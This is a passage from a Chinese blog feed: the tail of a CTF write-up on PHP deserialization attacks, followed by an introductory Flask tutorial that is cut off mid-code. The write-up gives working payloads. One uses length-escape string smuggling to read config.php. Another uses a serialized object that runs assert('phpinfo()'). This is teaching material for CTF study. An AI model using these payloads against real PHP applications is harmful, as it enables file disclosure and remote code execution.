class="string">'name'</span>]);</span><br></pre></td></tr></table></figure><p>$profile是这样定义的结合上面的读取文件操作可知其中的photo变量如果控制令其为config.php即可读取到flag，于是初步payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"11111111111"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">9</span>:<span class="string">"aa@aa.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;s:<span class="number">3</span>:<span class="string">"aaa"</span>;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;s:<span class="number">39</span>:<span class="string">"upload/0cc175b9c0f1b6a831c399e269772661"</span>;&#125;</span><br></pre></td></tr></table></figure><p>反序列化只反到第一个<code>}</code>结束，后面的自动丢弃，但是photo似乎不是我们能够直接控制的，源码中<code>photo= &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code>，也就是说我们不能直接更改photo中的内容了，于是就需要找到序列化后的其它可利用参数再其后写上<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>，达到修改的效果，phone，email，nickname都是我们可控的，而phone和email经过了严格的过滤（详情看上面的update.php源码），再来看看nickname：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure><p><code>nickname[]</code>数组绕过<code>preg_match</code>和<code>strlen</code>即可，两边判断均为<code>false</code>，故不会执行if中的语句，于是再构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"11111111111"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">9</span>:<span class="string">"aa@aa.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">3</span>:<span class="string">"aaa"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">39</span>:<span class="string">"upload/0cc175b9c0f1b6a831c399e269772661"</span>;&#125;</span><br></pre></td></tr></table></figure><p>到这里是否就已经可以成功读取到文件了呢？并非如此，如果要进行如上的操作，就需要给<code>nickname[]</code>传<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>这样的一个值，传入后将会是这个样子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"11111111111"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">9</span>:<span class="string">"aa@aa.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">34</span>:<span class="string">""</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:39:"</span>upload/<span class="number">0</span>cc175b9c0f1b6a831c399e269772661<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>虽然看上去大括号被闭合了，但是要注意到<code>s:34</code>这里，在反序列化的时候进行数据读取的时候依然会读取到引号中的34位字符，就对于没有闭合上，那有该如何利用呢？再接着看代码，</p><p>看看将<code>$profile</code>序列化结果存入数据库时的操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可看见对传入的参数进行了处理，跟进父类的<code>filter</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见<code>$string</code>参数经过了两次过滤，第一次等于没用，两次应该都是来防止sql注入的，但这里似乎也不存在sql注入，序列化后的<code>$profile</code>不可能有sql注入风险，而<code>$username</code>的取值来自<code>$_SESSION[&#39;username&#39;]</code>，而<code>username</code>的<code>session</code>是系统分配的，这里也不存在sql注入，所以想想怎么利用在反序列化上面</p><p>这里就涉及到本题的核心了，<strong>反序列化长度逃逸字符</strong></p><p>在php反序列化的守护是根据s后面的值来取字符串长度的，而在<code>filter</code>方法总存在<code>preg_replace</code>替换，如果有<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>其中之一就替换成<code>&#39;hacker&#39;</code>，<code>hacker</code>长度为6位，试想如果替换了里面长度小于6位的字符串，而s后的取值长度发值有没变，那么就会有末尾的字符溢出不会被读取到，而没被读取到的话自然就被当做序列化后的格式处理，再结合这里，改闭合的大括号就可以闭合的上，再看看我们需要逃逸的字符串<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>，就是这34位，而替换的字符串中正好一个有比<code>hacker</code>短的字符串<code>where</code>，那么一次就可以逃逸一个出来，那么直接传入34个<code>where</code>就可以将<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>完整的逃逸出来，于是最终<code>payload</code>如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"11111111111"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">9</span>:<span class="string">"aa@aa.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">34</span>:<span class="string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:39:"</span>upload/<span class="number">0</span>cc175b9c0f1b6a831c399e269772661<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>令<code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>即可</p><p>随后发包：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412212311132.png" alt=""></p><p>查看<code>profile.php</code>网页页面源代码，将图片的base64解可得到<code>config.php</code>的内容，即可得到flag</p><h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="NPUCTF2020-ReadlezPHP"></a>NPUCTF2020-ReadlezPHP</h3><p>F12后点进去可以看到源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200422183658606.png" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-22</span> <span class="number">10</span>:<span class="number">14</span>:<span class="number">24</span></span><br></pre></td></tr></table></figure><p>简单的反序列化</p><p><code>__destruct</code>方法在反序列化的时候触发，里面的<code>$b($a)</code>即作为代码执行的条件，于是可以构造<code>assert(phpinfo())</code>，<code>payload</code>如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a = <span class="string">'phpinfo()'</span>;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">"assert"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br></pre></td></tr></table></figure><p>将结果传入<code>data</code>搜索flag即可得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识Flask</title>
      <link href="/2020/03/28/%E5%88%9D%E8%AF%86Flask/"/>
      <url>/2020/03/28/%E5%88%9D%E8%AF%86Flask/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%88%9D%E8%AF%86Flask/flask-icon.png" alt=""></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Flask是一个用Python编写的Web应用程序框架。 它由 <strong>Armin Ronacher</strong> 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和<a href="http://docs.jinkan.org/docs/jinja2/" target="_blank" rel="noopener">Jinja2</a>模板引擎。两者都是Pocco项目。</p><p><a href="https://dormousehole.readthedocs.io/en/latest/" target="_blank" rel="noopener">Flask中文文档</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Python2.7及以上，Python3.4及以上，我这里用的Python2.7</p><p><strong>安装virtualenv</strong></p><p>virtualenv可以创建一个独立的python运行环境，这个环境和系统的python环境是互不干扰的，也就是说你在这个环境中安装的python包不会安装到系统的python环境中，系统python环境中的包会复制到这个环境中（但新版本的virtualenv并不会复制过来，默认只安装<code>setuptools</code>，<code>wheel</code>和<code>pip</code>）</p><p>当然如果不想用系统的包的话可以加一些参数：</p><p><code>–-no-site-packages</code>：表示在建立虚拟环境时不将原版本中的第三方库拷贝过来，这样就能获得一个纯净的Python环境。（可这个参数新版的virtualenv好像用不了，我的就是这样，但网上都这样讲，=.=）</p><p><code>--no-setuptools</code>：不安装setuptools；<code>--no-wheel</code>：不安装whell；<code>--no-pip</code>：不安装pip</p><p>安装virtualenv包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure><p>创建环境：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir Flask  #创建项目目录</span><br><span class="line">cd Flask</span><br><span class="line">virtualenv -p C:\Python2\python.exe E:\flask\venv  #在这个项目中创建一个独立的python环境，环境命名为venv，-p表示指定python的版本路径</span><br><span class="line">.\venv\Scripts\activate  #启动虚拟环境;deactivate可退出此环境</span><br></pre></td></tr></table></figure><p>接下来就要在这个虚拟环境中安装Flask了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\flask\venv\Scripts\python.exe -m pip list  #可看到当前虚拟环境中的所有的python包，当然不加路径也可以</span><br><span class="line">pip install Flask</span><br></pre></td></tr></table></figure><p>至此虚拟环境就搭建成功了，当然如果你不想用虚拟的python环境用系统自带的也可以</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask <span class="comment">#导入Flask模块</span></span><br><span class="line">app = Flask(__name__)<span class="comment">#使用当前模块作为参数</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>app.route(rule, options)</code>：该函数为<code>Flask</code>类的一个方法，告诉应用程序哪个URL应该调用相关的函数</p><ul><li><strong>rule</strong>：参数表示与该函数的URL绑定</li><li><strong>endpoint</strong>：被注册的url的名字，一般用来反向生成url的时候使用，默认把视图函数的名字作为endpoint，如:endpoint=”login”</li><li><strong>options</strong>：是要转发给基础Rule对象的参数列表。</li></ul><p>上面的<code>&#39;/&#39;</code>表示URL与hello_world函数绑定，在浏览器中打开web服务器的主页时，将呈现该函数的输出</p><p><code>app.run(host, port, debug, options)</code>：表示本地开发服务器上运行应用程序</p><ul><li><strong>host</strong>：要监听的主机名。 默认为127.0.0.1（localhost）。设置为“0.0.0.0”以使服务器在外部可用</li><li><strong>port</strong>：端口设置，默认值为5000</li><li><strong>debug</strong>：默认为false。 如果设置为true，则提供调试信息</li><li><strong>options</strong>：要转发到底层的Werkzeug服务器。</li></ul><p>浏览器访问<code>http://127.0.0.1:5000/</code>即可看到函数的输出</p><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment">#@app.route('/hello')  #添加路由</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World'</span></span><br><span class="line">app.add_url_rule(<span class="string">'/hello/'</span>,<span class="string">'hello'</span>,view_func=hello_world)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>app.add_url_rule(rule,endpoint,view_func,options)</code>：该方法与route类似</p><ul><li><strong>rule</strong>：一个字符串格式的url规则，如：”/login”</li><li><strong>endpoint</strong>：url规则的名字，用来反向生成url使用，默认是视图函数的名字。</li><li><strong>view_func</strong>：视图函数，当对应的endpoint名字被请求时需要调用的函数。</li><li><strong>options</strong>： 类似route时候的options，methods参数默认是只监听get</li></ul><h2 id="变量规则"><a href="#变量规则" class="headerlink" title="变量规则"></a>变量规则</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/hello/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello &#123; &#125;'</span>.format(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>在浏览器输入<code>http://127.0.0.1:5000/hello/flask</code>则会显示<code>Hello flask</code></p><p>除了默认字符串变量部分之外，还可以使用以下转换器构建规则：</p><ul><li><strong>int</strong>：接受整数，不为整数则404，<code>@app.route(&#39;/hello/&lt;int:name&gt;&#39;)</code></li><li><strong>float</strong>：接受浮点数，不为浮点数则404，<code>@app.route(&#39;/hello/&lt;float:name&gt;&#39;)</code></li><li><strong>path</strong>：接受用作目录分隔符的斜杠，<code>@app.route(&#39;/hello/&lt;path:name&gt;&#39;)</code></li></ul><h2 id="URL构建"><a href="#URL构建" class="headerlink" title="URL构建"></a>URL构建</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, url_for</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/name')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_admin</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'hello Admin'</span></span><br><span class="line"><span class="meta">@app.route('/guest/&lt;guest&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_guest</span><span class="params">(guest)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'Hello &#123; &#125; as Guest'</span>.format(guest)</span><br><span class="line"><span class="meta">@app.route('/user/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_user</span><span class="params">(name)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> name == <span class="string">'admin'</span>:</span><br><span class="line">       <span class="keyword">return</span> redirect(url_for(<span class="string">'hello_admin'</span>))<span class="comment">#redirect函数直接对route的路径进行访问，url_for直接对函数进行访问，一同使用则访问此路径下的函数</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> redirect(url_for(<span class="string">'hello_guest'</span>,guest = name))</span><br><span class="line">       </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>redirect(location, code=302, Response=None)</code>：该函数用来实现重定向功能</p><ul><li><strong>location</strong>：一个链接地址，可以使用url_for()函数得到，也可以是静态文件地址</li><li><strong>code</strong>：可以取值为301、302、303、305、307，默认302,300、304不可以</li><li><strong>Response</strong>：一个响应类，默认是werkzeug.wrappers.Response</li></ul><p>输入<code>http://127.0.0.1:5000/user/admin</code>则会302重定向到<code>http://127.0.0.1:5000/name</code>显示hello Admin</p><p><code>http://127.0.0.1:5000/user/flask</code>则会302重定向到<code>http://127.0.0.1:5000/guest/flask</code>，显示Hello flask as Guest</p><h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><p>首先创建一个HTML表单，使用POST方法将表单数据发送到URL，命名为login.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">"http://localhost:5000/login"</span> <span class="attr">method</span> = <span class="string">"post"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span>Enter Name:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"nm"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"submit"</span> <span class="attr">value</span> = <span class="string">"submit"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, url_for, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/success/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">(name)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'welcome &#123; &#125;'</span>.format(name)</span><br><span class="line"><span class="meta">@app.route('/login',methods = ['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">       user = request.form[<span class="string">'nm'</span>]  <span class="comment">#获取参数nm的值</span></span><br><span class="line">       <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>,name = user))</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       user = request.args.get(<span class="string">'nm'</span>)</span><br><span class="line">       <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>,name = user))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><strong>Request</strong>对象</p><ul><li><strong>Form</strong>：是一个字典对象,包含表单参数及其值的键和值对。</li><li><strong>args</strong>：解析查询字符串的内容，是包含表单参数对及其对应值对的列表的字典对象</li><li><strong>Cookies</strong>：保存Cookie名称和值的字典对象。</li><li><strong>files</strong>：与上传文件有关的数据。</li><li><strong>method</strong>：当前请求方法。</li></ul><p>输入flask回车后先跳转到<code>http://127.0.0.1:5000/login</code>然后自动POST一个nm参数后302重定向到<code>http://127.0.0.1:5000/success/flask</code>输出welcome flask</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Hello World&lt;/h1&gt;'</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>访问网站会得到一个Hello World标题，但这样吧标签插入在python代码中就很麻烦，于是这里就引入了<strong>Jinja2</strong>模板引擎，可以通过<strong>render_template()</strong>函数呈现HTML文件。</p><p>新建一个templates文件夹，在其中建立一个hello.html文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123; &#123;  marks &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/hello/')</span></span><br><span class="line"><span class="meta">@app.route('/hello/&lt;score&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> 